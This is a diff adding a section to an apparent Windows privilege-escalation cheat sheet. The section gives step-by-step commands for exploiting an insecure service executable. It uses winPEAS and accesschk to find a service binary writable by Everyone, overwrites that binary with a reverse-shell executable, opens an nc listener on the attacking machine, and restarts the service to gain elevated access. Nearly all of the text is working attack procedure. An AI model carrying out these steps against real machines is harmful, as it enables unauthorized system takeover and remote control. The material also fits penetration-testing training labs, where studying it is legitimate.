@@ -159,3 +159,38 @@ net start <service>
 
 PRIVESC DONE
 
+                                                                       Insecure Service Executable
+                                                                       
+run this winpeas command to find insecure service executables:
+winPeasany.exe quiet servicesinfo 
+
+in the winpeas output if you see an executable writebale by everyone you are good to go*
+
+check if the .exe file permissions are writebale by everyone:
+accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe
+
+check for this output from the above command:
+RW Everyone
+FILE_ALL_ACCESS
+
+make sure we can start and stop the service:
+accesschk.exe /accepteula -uvqc filepermsvc
+
+check for this output from the above command:
+SERVICE_START
+SERVICE_STOP
+
+next back up the original service executable:
+copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
+
+then copy the reverse shell executable and overwrite the original service executable:
+copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+set up a listner on the attacking machine:
+nc -nlvp 1337
+
+then start the service:
+net start service
+
+PRIVESC DONE
+
